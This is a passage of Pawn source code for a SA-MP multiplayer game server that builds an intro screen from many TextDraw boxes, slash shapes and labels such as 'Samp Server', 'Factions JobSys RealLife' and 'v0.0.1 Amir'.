	IntroText5[5] = TextDrawCreate(-8,77,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText5[5],0.449999,6.599996); TextDrawAlignment(IntroText5[5],0); TextDrawBackgroundColor(IntroText5[5],0x000000FF); TextDrawFont(IntroText5[5],3); TextDrawUseBox(IntroText5[5],1); TextDrawBoxColor(IntroText5[5],0x000000FF); TextDrawTextSize(IntroText5[5],228.000000,87.000000); TextDrawSetOutline(IntroText5[5],0); TextDrawSetProportional(IntroText5[5],1); TextDrawSetShadow(IntroText5[5],1);
	IntroText5[6] = TextDrawCreate(480,76,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText5[6],0.449999,6.599996); TextDrawAlignment(IntroText5[6],0); TextDrawBackgroundColor(IntroText5[6],0x000000FF); TextDrawFont(IntroText5[6],3); TextDrawUseBox(IntroText5[6],1); TextDrawBoxColor(IntroText5[6],0x000000FF); TextDrawTextSize(IntroText5[6],716.000000,86.000000); TextDrawSetOutline(IntroText5[6],0); TextDrawSetProportional(IntroText5[6],1); TextDrawSetShadow(IntroText5[6],1);
	IntroText5[7] = TextDrawCreate(-20,-109,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText5[7],0.500000,4.499998); TextDrawAlignment(IntroText5[7],0); TextDrawBackgroundColor(IntroText5[7],0x000000FF); TextDrawFont(IntroText5[7],3); TextDrawUseBox(IntroText5[7],1); TextDrawBoxColor(IntroText5[7],0x000000FF); TextDrawTextSize(IntroText5[7],649.000000,-99.000000); TextDrawSetOutline(IntroText5[7],0); TextDrawSetProportional(IntroText5[7],1); TextDrawSetShadow(IntroText5[7],1);
	IntroText5[8] = TextDrawCreate(-10,338,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText5[8],0.500000,4.499998); TextDrawAlignment(IntroText5[8],0); TextDrawBackgroundColor(IntroText5[8],0x000000FF); TextDrawFont(IntroText5[8],3); TextDrawUseBox(IntroText5[8],1); TextDrawBoxColor(IntroText5[8],0x000000FF); TextDrawTextSize(IntroText5[8],659.000000,348.000000); TextDrawSetOutline(IntroText5[8],0); TextDrawSetProportional(IntroText5[8],1); TextDrawSetShadow(IntroText5[8],1);
	IntroText5[9] = TextDrawCreate(414,294,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText5[9],0.399999,2.999999); TextDrawAlignment(IntroText5[9],0); TextDrawBackgroundColor(IntroText5[9],0x000000FF); TextDrawFont(IntroText5[9],3); TextDrawUseBox(IntroText5[9],1); TextDrawBoxColor(IntroText5[9],0x000000FF); TextDrawTextSize(IntroText5[9],478.000000,304.000000); TextDrawSetOutline(IntroText5[9],0); TextDrawSetProportional(IntroText5[9],1); TextDrawSetShadow(IntroText5[9],1);
	IntroText5[10] = TextDrawCreate(477,245,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText5[10],0.399999,2.999999); TextDrawAlignment(IntroText5[10],0); TextDrawBackgroundColor(IntroText5[10],0x000000FF); TextDrawFont(IntroText5[10],3); TextDrawUseBox(IntroText5[10],1); TextDrawBoxColor(IntroText5[10],0x000000FF); TextDrawTextSize(IntroText5[10],541.000000,255.000000); TextDrawSetOutline(IntroText5[10],0); TextDrawSetProportional(IntroText5[10],1); TextDrawSetShadow(IntroText5[10],1);
	IntroText5[11] = TextDrawCreate(415,-16,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText5[11],0.399999,2.999999); TextDrawAlignment(IntroText5[11],0); TextDrawBackgroundColor(IntroText5[11],0x000000FF); TextDrawFont(IntroText5[11],3); TextDrawUseBox(IntroText5[11],1); TextDrawBoxColor(IntroText5[11],0x000000FF); TextDrawTextSize(IntroText5[11],479.000000,-6.000000); TextDrawSetOutline(IntroText5[11],0); TextDrawSetProportional(IntroText5[11],1); TextDrawSetShadow(IntroText5[11],1);
	IntroText5[12] = TextDrawCreate(393,-35,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText5[12],0.399999,2.999999); TextDrawAlignment(IntroText5[12],0); TextDrawBackgroundColor(IntroText5[12],0x000000FF); TextDrawFont(IntroText5[12],3); TextDrawUseBox(IntroText5[12],1); TextDrawBoxColor(IntroText5[12],0x000000FF); TextDrawTextSize(IntroText5[12],457.000000,-25.000000); TextDrawSetOutline(IntroText5[12],0); TextDrawSetProportional(IntroText5[12],1); TextDrawSetShadow(IntroText5[12],1);
	IntroText5[13] = TextDrawCreate(457,-10,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText5[13],0.399999,2.999999); TextDrawAlignment(IntroText5[13],0); TextDrawBackgroundColor(IntroText5[13],0x000000FF); TextDrawFont(IntroText5[13],3); TextDrawUseBox(IntroText5[13],1); TextDrawBoxColor(IntroText5[13],0x000000FF); TextDrawTextSize(IntroText5[13],521.000000,0.000000); TextDrawSetOutline(IntroText5[13],0); TextDrawSetProportional(IntroText5[13],1); TextDrawSetShadow(IntroText5[13],1);
	IntroText5[14] = TextDrawCreate(285,271,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText5[14],0.399999,2.999999); TextDrawAlignment(IntroText5[14],0); TextDrawBackgroundColor(IntroText5[14],0x000000FF); TextDrawFont(IntroText5[14],3); TextDrawUseBox(IntroText5[14],1); TextDrawBoxColor(IntroText5[14],0x000000FF); TextDrawTextSize(IntroText5[14],349.000000,281.000000); TextDrawSetOutline(IntroText5[14],0); TextDrawSetProportional(IntroText5[14],1); TextDrawSetShadow(IntroText5[14],1);
	IntroText5[15] = TextDrawCreate(220,251,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText5[15],0.399999,2.999999); TextDrawAlignment(IntroText5[15],0); TextDrawBackgroundColor(IntroText5[15],0x000000FF); TextDrawFont(IntroText5[15],3); TextDrawUseBox(IntroText5[15],1); TextDrawBoxColor(IntroText5[15],0x000000FF); TextDrawTextSize(IntroText5[15],284.000000,261.000000); TextDrawSetOutline(IntroText5[15],0); TextDrawSetProportional(IntroText5[15],1); TextDrawSetShadow(IntroText5[15],1);
	IntroText5[16] = TextDrawCreate(214,24,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText5[16],0.399999,2.999999); TextDrawAlignment(IntroText5[16],0); TextDrawBackgroundColor(IntroText5[16],0x000000FF); TextDrawFont(IntroText5[16],3); TextDrawUseBox(IntroText5[16],1); TextDrawBoxColor(IntroText5[16],0x000000FF); TextDrawTextSize(IntroText5[16],278.000000,34.000000); TextDrawSetOutline(IntroText5[16],0); TextDrawSetProportional(IntroText5[16],1); TextDrawSetShadow(IntroText5[16],1);
	IntroText5[17] = TextDrawCreate(277,4,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText5[17],0.449999,2.999999); TextDrawAlignment(IntroText5[17],0); TextDrawBackgroundColor(IntroText5[17],0x000000FF); TextDrawFont(IntroText5[17],3); TextDrawUseBox(IntroText5[17],1); TextDrawBoxColor(IntroText5[17],0x000000FF); TextDrawTextSize(IntroText5[17],356.000000,14.000000); TextDrawSetOutline(IntroText5[17],0); TextDrawSetProportional(IntroText5[17],1); TextDrawSetShadow(IntroText5[17],1);
	IntroText5[18] = TextDrawCreate(289,333,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText5[18],0.449999,2.999999); TextDrawAlignment(IntroText5[18],0); TextDrawBackgroundColor(IntroText5[18],0x000000FF); TextDrawFont(IntroText5[18],3); TextDrawUseBox(IntroText5[18],1); TextDrawBoxColor(IntroText5[18],0x000000FF); TextDrawTextSize(IntroText5[18],368.000000,343.000000); TextDrawSetOutline(IntroText5[18],0); TextDrawSetProportional(IntroText5[18],1); TextDrawSetShadow(IntroText5[18],1);
	IntroText5[19] = TextDrawCreate(165,252,"~l~/"); TextDrawLetterSize(IntroText5[19],8.350013,-1.700000); TextDrawAlignment(IntroText5[19],0); TextDrawBackgroundColor(IntroText5[19],0x000000FF); TextDrawFont(IntroText5[19],3); TextDrawUseBox(IntroText5[19],0); TextDrawSetOutline(IntroText5[19],0); TextDrawSetProportional(IntroText5[19],1); TextDrawSetShadow(IntroText5[19],0);
	IntroText5[20] = TextDrawCreate(167,256,"~l~/"); TextDrawLetterSize(IntroText5[20],8.350013,-1.700000); TextDrawAlignment(IntroText5[20],0); TextDrawBackgroundColor(IntroText5[20],0x000000FF); TextDrawFont(IntroText5[20],3); TextDrawUseBox(IntroText5[20],0); TextDrawSetOutline(IntroText5[20],0); TextDrawSetProportional(IntroText5[20],1); TextDrawSetShadow(IntroText5[20],0);
	IntroText5[21] = TextDrawCreate(472,90,"~l~/"); TextDrawLetterSize(IntroText5[21],0.750000,21.000043); TextDrawAlignment(IntroText5[21],0); TextDrawBackgroundColor(IntroText5[21],0x000000FF); TextDrawFont(IntroText5[21],3); TextDrawUseBox(IntroText5[21],0); TextDrawSetOutline(IntroText5[21],0); TextDrawSetProportional(IntroText5[21],1); TextDrawSetShadow(IntroText5[21],0);
	IntroText5[22] = TextDrawCreate(412,108,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText5[22],0.399999,5.099997); TextDrawAlignment(IntroText5[22],0); TextDrawBackgroundColor(IntroText5[22],0x000000FF); TextDrawFont(IntroText5[22],3); TextDrawUseBox(IntroText5[22],1); TextDrawBoxColor(IntroText5[22],0x000000FF); TextDrawTextSize(IntroText5[22],412.000000,118.000000); TextDrawSetOutline(IntroText5[22],0); TextDrawSetProportional(IntroText5[22],1); TextDrawSetShadow(IntroText5[22],1);
	IntroText5[23] = TextDrawCreate(345,193,"~l~/"); TextDrawLetterSize(IntroText5[23],0.750000,21.000043); TextDrawAlignment(IntroText5[23],0); TextDrawBackgroundColor(IntroText5[23],0x000000FF); TextDrawFont(IntroText5[23],3); TextDrawUseBox(IntroText5[23],0); TextDrawSetOutline(IntroText5[23],0); TextDrawSetProportional(IntroText5[23],1); TextDrawSetShadow(IntroText5[23],0);
	IntroText5[24] = TextDrawCreate(350,57,"~l~/"); TextDrawLetterSize(IntroText5[24],0.750000,21.000043); TextDrawAlignment(IntroText5[24],0); TextDrawBackgroundColor(IntroText5[24],0x000000FF); TextDrawFont(IntroText5[24],3); TextDrawUseBox(IntroText5[24],0); TextDrawSetOutline(IntroText5[24],0); TextDrawSetProportional(IntroText5[24],1); TextDrawSetShadow(IntroText5[24],0);
	IntroText5[25] = TextDrawCreate(281,324,"~l~/"); TextDrawLetterSize(IntroText5[25],0.750000,-10.000001); TextDrawAlignment(IntroText5[25],0); TextDrawBackgroundColor(IntroText5[25],0x000000FF); TextDrawFont(IntroText5[25],3); TextDrawUseBox(IntroText5[25],0); TextDrawSetOutline(IntroText5[25],0); TextDrawSetProportional(IntroText5[25],1); TextDrawSetShadow(IntroText5[25],0);
	IntroText5[26] = TextDrawCreate(275,252,"~l~/"); TextDrawLetterSize(IntroText5[26],0.750000,-10.000001); TextDrawAlignment(IntroText5[26],0); TextDrawBackgroundColor(IntroText5[26],0x000000FF); TextDrawFont(IntroText5[26],3); TextDrawUseBox(IntroText5[26],0); TextDrawSetOutline(IntroText5[26],0); TextDrawSetProportional(IntroText5[26],1); TextDrawSetShadow(IntroText5[26],0);
	IntroText5[27] = TextDrawCreate(228,110,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText5[27],0.399999,5.099997); TextDrawAlignment(IntroText5[27],0); TextDrawBackgroundColor(IntroText5[27],0x000000FF); TextDrawFont(IntroText5[27],3); TextDrawUseBox(IntroText5[27],1); TextDrawBoxColor(IntroText5[27],0x000000FF); TextDrawTextSize(IntroText5[27],228.000000,120.000000); TextDrawSetOutline(IntroText5[27],0); TextDrawSetProportional(IntroText5[27],1); TextDrawSetShadow(IntroText5[27],1);
	IntroText5[28] = TextDrawCreate(467,221,"~l~/"); TextDrawLetterSize(IntroText5[28],0.750000,21.000043); TextDrawAlignment(IntroText5[28],0); TextDrawBackgroundColor(IntroText5[28],0x000000FF); TextDrawFont(IntroText5[28],3); TextDrawUseBox(IntroText5[28],0); TextDrawSetOutline(IntroText5[28],0); TextDrawSetProportional(IntroText5[28],1); TextDrawSetShadow(IntroText5[28],0);
	IntroText5[29] = TextDrawCreate(343,110,"~l~/"); TextDrawLetterSize(IntroText5[29],7.700011,-1.700000); TextDrawAlignment(IntroText5[29],0); TextDrawBackgroundColor(IntroText5[29],0x000000FF); TextDrawFont(IntroText5[29],3); TextDrawUseBox(IntroText5[29],0); TextDrawSetOutline(IntroText5[29],0); TextDrawSetProportional(IntroText5[29],1); TextDrawSetShadow(IntroText5[29],0);
	IntroText5[30] = TextDrawCreate(406,136,"~l~/"); TextDrawLetterSize(IntroText5[30],8.350013,-1.700000); TextDrawAlignment(IntroText5[30],0); TextDrawBackgroundColor(IntroText5[30],0x000000FF); TextDrawFont(IntroText5[30],3); TextDrawUseBox(IntroText5[30],0); TextDrawSetOutline(IntroText5[30],0); TextDrawSetProportional(IntroText5[30],1); TextDrawSetShadow(IntroText5[30],0);
	IntroText5[31] = TextDrawCreate(182,85,"~y~Sabke Bazi:"); TextDrawLetterSize(IntroText5[31],0.850000,3.099999); TextDrawAlignment(IntroText5[31],0); TextDrawBackgroundColor(IntroText5[31],0x000000FF); TextDrawFont(IntroText5[31],0); TextDrawUseBox(IntroText5[31],0); TextDrawSetOutline(IntroText5[31],0); TextDrawSetProportional(IntroText5[31],1); TextDrawSetShadow(IntroText5[31],0);
	IntroText5[32] = TextDrawCreate(285,113,"Samp Server"); TextDrawLetterSize(IntroText5[32],0.500000,2.399999); TextDrawAlignment(IntroText5[32],0); TextDrawBackgroundColor(IntroText5[32],0x658379FF); TextDrawFont(IntroText5[32],1); TextDrawUseBox(IntroText5[32],0); TextDrawSetOutline(IntroText5[32],0); TextDrawSetProportional(IntroText5[32],1); TextDrawSetShadow(IntroText5[32],0);
	IntroText5[33] = TextDrawCreate(217,179,"Factions~n~JobSys~n~RealLife~n~"); TextDrawLetterSize(IntroText5[33],0.500000,2.399999); TextDrawAlignment(IntroText5[33],3); TextDrawBackgroundColor(IntroText5[33],0x658379FF); TextDrawFont(IntroText5[33],1); TextDrawUseBox(IntroText5[33],0); TextDrawSetOutline(IntroText5[33],0); TextDrawSetProportional(IntroText5[33],1); TextDrawSetShadow(IntroText5[33],0);
	IntroText5[34] = TextDrawCreate(35,150,"~y~Mavared:"); TextDrawLetterSize(IntroText5[34],0.850000,3.099999); TextDrawAlignment(IntroText5[34],0); TextDrawBackgroundColor(IntroText5[34],0x000000FF); TextDrawFont(IntroText5[34],0); TextDrawUseBox(IntroText5[34],0); TextDrawSetOutline(IntroText5[34],0); TextDrawSetProportional(IntroText5[34],1); TextDrawSetShadow(IntroText5[34],0);
	IntroText5[35] = TextDrawCreate(339,291,"v0.0.1 Amir~n~"); TextDrawLetterSize(IntroText5[35],0.500000,2.399999); TextDrawAlignment(IntroText5[35],3); TextDrawBackgroundColor(IntroText5[35],0x658379FF); TextDrawFont(IntroText5[35],1); TextDrawUseBox(IntroText5[35],0); TextDrawSetOutline(IntroText5[35],0); TextDrawSetProportional(IntroText5[35],1); TextDrawSetShadow(IntroText5[35],0);
	IntroText5[36] = TextDrawCreate(285,265,"~y~Edition"); TextDrawLetterSize(IntroText5[36],0.850000,3.099999); TextDrawAlignment(IntroText5[36],0); TextDrawBackgroundColor(IntroText5[36],0x000000FF); TextDrawFont(IntroText5[36],0); TextDrawUseBox(IntroText5[36],0); TextDrawSetOutline(IntroText5[36],0); TextDrawSetProportional(IntroText5[36],1); TextDrawSetShadow(IntroText5[36],0);
	IntroText6[0] = TextDrawCreate(248,129,"_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText6[0],0.600000,6.099996); TextDrawAlignment(IntroText6[0],0); TextDrawBackgroundColor(IntroText6[0],0x000000FF); TextDrawFont(IntroText6[0],3); TextDrawUseBox(IntroText6[0],1); TextDrawBoxColor(IntroText6[0],0x000000FF); TextDrawTextSize(IntroText6[0],314.000000,146.000000); TextDrawSetOutline(IntroText6[0],0); TextDrawSetProportional(IntroText6[0],1); TextDrawSetShadow(IntroText6[0],1);
	IntroText6[1] = TextDrawCreate(372,128,"_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText6[1],0.600000,6.099996); TextDrawAlignment(IntroText6[1],0); TextDrawBackgroundColor(IntroText6[1],0x000000FF); TextDrawFont(IntroText6[1],3); TextDrawUseBox(IntroText6[1],1); TextDrawBoxColor(IntroText6[1],0x000000FF); TextDrawTextSize(IntroText6[1],438.000000,145.000000); TextDrawSetOutline(IntroText6[1],0); TextDrawSetProportional(IntroText6[1],1); TextDrawSetShadow(IntroText6[1],1);
	IntroText6[2] = TextDrawCreate(433,138,"_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText6[2],0.600000,6.099996); TextDrawAlignment(IntroText6[2],0); TextDrawBackgroundColor(IntroText6[2],0x000000FF); TextDrawFont(IntroText6[2],3); TextDrawUseBox(IntroText6[2],1); TextDrawBoxColor(IntroText6[2],0x000000FF); TextDrawTextSize(IntroText6[2],499.000000,155.000000); TextDrawSetOutline(IntroText6[2],0); TextDrawSetProportional(IntroText6[2],1); TextDrawSetShadow(IntroText6[2],1);
	IntroText6[3] = TextDrawCreate(305,113,"_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText6[3],0.600000,6.699995); TextDrawAlignment(IntroText6[3],0); TextDrawBackgroundColor(IntroText6[3],0x000000FF); TextDrawFont(IntroText6[3],3); TextDrawUseBox(IntroText6[3],1); TextDrawBoxColor(IntroText6[3],0x000000FF); TextDrawTextSize(IntroText6[3],371.000000,130.000000); TextDrawSetOutline(IntroText6[3],0); TextDrawSetProportional(IntroText6[3],1); TextDrawSetShadow(IntroText6[3],1);
	IntroText6[4] = TextDrawCreate(311,91,"~l~/"); TextDrawLetterSize(IntroText6[4],0.700000,12.700012); TextDrawAlignment(IntroText6[4],0); TextDrawBackgroundColor(IntroText6[4],0x000000FF); TextDrawFont(IntroText6[4],3); TextDrawUseBox(IntroText6[4],0); TextDrawSetOutline(IntroText6[4],0); TextDrawSetProportional(IntroText6[4],1); TextDrawSetShadow(IntroText6[4],0);
	IntroText6[5] = TextDrawCreate(306,182,"~l~/"); TextDrawLetterSize(IntroText6[5],0.700000,12.700012); TextDrawAlignment(IntroText6[5],0); TextDrawBackgroundColor(IntroText6[5],0x000000FF); TextDrawFont(IntroText6[5],3); TextDrawUseBox(IntroText6[5],0); TextDrawSetOutline(IntroText6[5],0); TextDrawSetProportional(IntroText6[5],1); TextDrawSetShadow(IntroText6[5],0);
	IntroText6[6] = TextDrawCreate(301,265,"~l~/"); TextDrawLetterSize(IntroText6[6],0.700000,12.700012); TextDrawAlignment(IntroText6[6],0); TextDrawBackgroundColor(IntroText6[6],0x000000FF); TextDrawFont(IntroText6[6],3); TextDrawUseBox(IntroText6[6],0); TextDrawSetOutline(IntroText6[6],0); TextDrawSetProportional(IntroText6[6],1); TextDrawSetShadow(IntroText6[6],0);
	IntroText6[7] = TextDrawCreate(372,103,"~l~/"); TextDrawLetterSize(IntroText6[7],0.700000,12.700012); TextDrawAlignment(IntroText6[7],0); TextDrawBackgroundColor(IntroText6[7],0x000000FF); TextDrawFont(IntroText6[7],3); TextDrawUseBox(IntroText6[7],0); TextDrawSetOutline(IntroText6[7],0); TextDrawSetProportional(IntroText6[7],1); TextDrawSetShadow(IntroText6[7],0);
	IntroText6[8] = TextDrawCreate(366,196,"~l~/"); TextDrawLetterSize(IntroText6[8],0.700000,12.700012); TextDrawAlignment(IntroText6[8],0); TextDrawBackgroundColor(IntroText6[8],0x000000FF); TextDrawFont(IntroText6[8],3); TextDrawUseBox(IntroText6[8],0); TextDrawSetOutline(IntroText6[8],0); TextDrawSetProportional(IntroText6[8],1); TextDrawSetShadow(IntroText6[8],0);
	IntroText6[9] = TextDrawCreate(433,108,"~l~/"); TextDrawLetterSize(IntroText6[9],0.700000,12.700012); TextDrawAlignment(IntroText6[9],0); TextDrawBackgroundColor(IntroText6[9],0x000000FF); TextDrawFont(IntroText6[9],3); TextDrawUseBox(IntroText6[9],0); TextDrawSetOutline(IntroText6[9],0); TextDrawSetProportional(IntroText6[9],1); TextDrawSetShadow(IntroText6[9],0);
	IntroText6[10] = TextDrawCreate(428,196,"~l~/"); TextDrawLetterSize(IntroText6[10],0.700000,12.700012); TextDrawAlignment(IntroText6[10],0); TextDrawBackgroundColor(IntroText6[10],0x000000FF); TextDrawFont(IntroText6[10],3); TextDrawUseBox(IntroText6[10],0); TextDrawSetOutline(IntroText6[10],0); TextDrawSetProportional(IntroText6[10],1); TextDrawSetShadow(IntroText6[10],0);
	IntroText6[11] = TextDrawCreate(360,286,"~l~/"); TextDrawLetterSize(IntroText6[11],0.700000,12.700012); TextDrawAlignment(IntroText6[11],0); TextDrawBackgroundColor(IntroText6[11],0x000000FF); TextDrawFont(IntroText6[11],3); TextDrawUseBox(IntroText6[11],0); TextDrawSetOutline(IntroText6[11],0); TextDrawSetProportional(IntroText6[11],1); TextDrawSetShadow(IntroText6[11],0);
	IntroText6[12] = TextDrawCreate(497,107,"_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText6[12],0.500000,6.399996); TextDrawAlignment(IntroText6[12],0); TextDrawBackgroundColor(IntroText6[12],0x000000FF); TextDrawFont(IntroText6[12],3); TextDrawUseBox(IntroText6[12],1); TextDrawBoxColor(IntroText6[12],0x000000FF); TextDrawTextSize(IntroText6[12],497.000000,117.000000); TextDrawSetOutline(IntroText6[12],0); TextDrawSetProportional(IntroText6[12],1); TextDrawSetShadow(IntroText6[12],1);
	IntroText6[13] = TextDrawCreate(257,355,"~l~/"); TextDrawLetterSize(IntroText6[13],7.900012,-1.300000); TextDrawAlignment(IntroText6[13],0); TextDrawBackgroundColor(IntroText6[13],0x000000FF); TextDrawFont(IntroText6[13],3); TextDrawUseBox(IntroText6[13],0); TextDrawSetOutline(IntroText6[13],0); TextDrawSetProportional(IntroText6[13],1); TextDrawSetShadow(IntroText6[13],0);
	IntroText6[14] = TextDrawCreate(307,129,"~l~/"); TextDrawLetterSize(IntroText6[14],7.900012,-1.300000); TextDrawAlignment(IntroText6[14],0); TextDrawBackgroundColor(IntroText6[14],0x000000FF); TextDrawFont(IntroText6[14],3); TextDrawUseBox(IntroText6[14],0); TextDrawSetOutline(IntroText6[14],0); TextDrawSetProportional(IntroText6[14],1); TextDrawSetShadow(IntroText6[14],0);
	IntroText6[15] = TextDrawCreate(241,359,"~l~/"); TextDrawLetterSize(IntroText6[15],7.900012,-1.300000); TextDrawAlignment(IntroText6[15],0); TextDrawBackgroundColor(IntroText6[15],0x000000FF); TextDrawFont(IntroText6[15],3); TextDrawUseBox(IntroText6[15],0); TextDrawSetOutline(IntroText6[15],0); TextDrawSetProportional(IntroText6[15],1); TextDrawSetShadow(IntroText6[15],0);
	IntroText6[16] = TextDrawCreate(314,125,"~l~/"); TextDrawLetterSize(IntroText6[16],7.900012,-1.300000); TextDrawAlignment(IntroText6[16],0); TextDrawBackgroundColor(IntroText6[16],0x000000FF); TextDrawFont(IntroText6[16],3); TextDrawUseBox(IntroText6[16],0); TextDrawSetOutline(IntroText6[16],0); TextDrawSetProportional(IntroText6[16],1); TextDrawSetShadow(IntroText6[16],0);
	IntroText6[17] = TextDrawCreate(1,85,"_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText6[17],0.750000,7.699995); TextDrawAlignment(IntroText6[17],0); TextDrawBackgroundColor(IntroText6[17],0x000000FF); TextDrawFont(IntroText6[17],3); TextDrawUseBox(IntroText6[17],1); TextDrawBoxColor(IntroText6[17],0x000000FF); TextDrawTextSize(IntroText6[17],254.000000,95.000000); TextDrawSetOutline(IntroText6[17],0); TextDrawSetProportional(IntroText6[17],1); TextDrawSetShadow(IntroText6[17],1);
	IntroText6[18] = TextDrawCreate(498,84,"_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText6[18],0.750000,7.699995); TextDrawAlignment(IntroText6[18],0); TextDrawBackgroundColor(IntroText6[18],0x000000FF); TextDrawFont(IntroText6[18],3); TextDrawUseBox(IntroText6[18],1); TextDrawBoxColor(IntroText6[18],0x000000FF); TextDrawTextSize(IntroText6[18],751.000000,94.000000); TextDrawSetOutline(IntroText6[18],0); TextDrawSetProportional(IntroText6[18],1); TextDrawSetShadow(IntroText6[18],1);
	IntroText6[19] = TextDrawCreate(-11,-161,"_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText6[19],0.750000,7.699995); TextDrawAlignment(IntroText6[19],0); TextDrawBackgroundColor(IntroText6[19],0x000000FF); TextDrawFont(IntroText6[19],3); TextDrawUseBox(IntroText6[19],1); TextDrawBoxColor(IntroText6[19],0x000000FF); TextDrawTextSize(IntroText6[19],654.000000,-151.000000); TextDrawSetOutline(IntroText6[19],0); TextDrawSetProportional(IntroText6[19],1); TextDrawSetShadow(IntroText6[19],1);
	IntroText6[20] = TextDrawCreate(-1,354,"_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText6[20],0.750000,7.699995); TextDrawAlignment(IntroText6[20],0); TextDrawBackgroundColor(IntroText6[20],0x000000FF); TextDrawFont(IntroText6[20],3); TextDrawUseBox(IntroText6[20],1); TextDrawBoxColor(IntroText6[20],0x000000FF); TextDrawTextSize(IntroText6[20],664.000000,364.000000); TextDrawSetOutline(IntroText6[20],0); TextDrawSetProportional(IntroText6[20],1); TextDrawSetShadow(IntroText6[20],1);
	IntroText6[21] = TextDrawCreate(432,170,"~l~/"); TextDrawLetterSize(IntroText6[21],7.900012,-1.300000); TextDrawAlignment(IntroText6[21],0); TextDrawBackgroundColor(IntroText6[21],0x000000FF); TextDrawFont(IntroText6[21],3); TextDrawUseBox(IntroText6[21],0); TextDrawSetOutline(IntroText6[21],0); TextDrawSetProportional(IntroText6[21],1); TextDrawSetShadow(IntroText6[21],0);
	IntroText6[22] = TextDrawCreate(433,164,"~l~/"); TextDrawLetterSize(IntroText6[22],7.900012,-1.300000); TextDrawAlignment(IntroText6[22],0); TextDrawBackgroundColor(IntroText6[22],0x000000FF); TextDrawFont(IntroText6[22],3); TextDrawUseBox(IntroText6[22],0); TextDrawSetOutline(IntroText6[22],0); TextDrawSetProportional(IntroText6[22],1); TextDrawSetShadow(IntroText6[22],0);
	IntroText6[23] = TextDrawCreate(215,118,"_"); TextDrawLetterSize(IntroText6[23],0.500000,3.399998); TextDrawAlignment(IntroText6[23],0); TextDrawBackgroundColor(IntroText6[23],0x000000FF); TextDrawFont(IntroText6[23],3); TextDrawUseBox(IntroText6[23],1); TextDrawBoxColor(IntroText6[23],0x000000FF); TextDrawTextSize(IntroText6[23],315.000000,128.000000); TextDrawSetOutline(IntroText6[23],0); TextDrawSetProportional(IntroText6[23],1); TextDrawSetShadow(IntroText6[23],1);
	IntroText6[24] = TextDrawCreate(205,321,"_"); TextDrawLetterSize(IntroText6[24],0.500000,3.399998); TextDrawAlignment(IntroText6[24],0); TextDrawBackgroundColor(IntroText6[24],0x000000FF); TextDrawFont(IntroText6[24],3); TextDrawUseBox(IntroText6[24],1); TextDrawBoxColor(IntroText6[24],0x000000FF); TextDrawTextSize(IntroText6[24],305.000000,331.000000); TextDrawSetOutline(IntroText6[24],0); TextDrawSetProportional(IntroText6[24],1); TextDrawSetShadow(IntroText6[24],1);
	IntroText6[25] = TextDrawCreate(382,111,"_"); TextDrawLetterSize(IntroText6[25],0.500000,3.399998); TextDrawAlignment(IntroText6[25],0); TextDrawBackgroundColor(IntroText6[25],0x000000FF); TextDrawFont(IntroText6[25],3); TextDrawUseBox(IntroText6[25],1); TextDrawBoxColor(IntroText6[25],0x000000FF); TextDrawTextSize(IntroText6[25],443.000000,121.000000); TextDrawSetOutline(IntroText6[25],0); TextDrawSetProportional(IntroText6[25],1); TextDrawSetShadow(IntroText6[25],1);
	IntroText6[26] = TextDrawCreate(443,116,"_"); TextDrawLetterSize(IntroText6[26],0.600000,4.599997); TextDrawAlignment(IntroText6[26],0); TextDrawBackgroundColor(IntroText6[26],0x000000FF); TextDrawFont(IntroText6[26],3); TextDrawUseBox(IntroText6[26],1); TextDrawBoxColor(IntroText6[26],0x000000FF); TextDrawTextSize(IntroText6[26],504.000000,133.000000); TextDrawSetOutline(IntroText6[26],0); TextDrawSetProportional(IntroText6[26],1); TextDrawSetShadow(IntroText6[26],1);
	IntroText6[27] = TextDrawCreate(369,315,"_"); TextDrawLetterSize(IntroText6[27],0.600000,4.599997); TextDrawAlignment(IntroText6[27],0); TextDrawBackgroundColor(IntroText6[27],0x000000FF); TextDrawFont(IntroText6[27],3); TextDrawUseBox(IntroText6[27],1); TextDrawBoxColor(IntroText6[27],0x000000FF); TextDrawTextSize(IntroText6[27],430.000000,332.000000); TextDrawSetOutline(IntroText6[27],0); TextDrawSetProportional(IntroText6[27],1); TextDrawSetShadow(IntroText6[27],1);
	IntroText6[28] = TextDrawCreate(432,296,"_"); TextDrawLetterSize(IntroText6[28],0.600000,6.099996); TextDrawAlignment(IntroText6[28],0); TextDrawBackgroundColor(IntroText6[28],0x000000FF); TextDrawFont(IntroText6[28],3); TextDrawUseBox(IntroText6[28],1); TextDrawBoxColor(IntroText6[28],0x000000FF); TextDrawTextSize(IntroText6[28],498.000000,313.000000); TextDrawSetOutline(IntroText6[28],0); TextDrawSetProportional(IntroText6[28],1); TextDrawSetShadow(IntroText6[28],1);
